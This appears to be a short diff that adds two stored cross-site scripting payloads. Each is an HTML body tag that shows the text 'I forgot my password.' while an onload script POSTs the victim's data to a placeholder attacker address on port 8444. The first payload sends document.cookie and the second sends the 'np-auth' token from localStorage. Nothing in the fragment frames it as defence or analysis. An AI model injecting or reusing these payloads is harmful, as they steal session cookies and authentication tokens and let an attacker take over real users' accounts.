@@ -1,0 +1,3 @@
+<body onload="var r= new XMLHttpRequest();r.open('POST','http://<IP ADDRESS>:8444/');r.send(document.cookie);">I forgot my password.</body>
+<body onload="var r= new XMLHttpRequest();r.open('POST','http://<IP ADDRESS>:8444/');r.send(localStorage.getItem('np-auth'));">I forgot my password.</bod
+y>
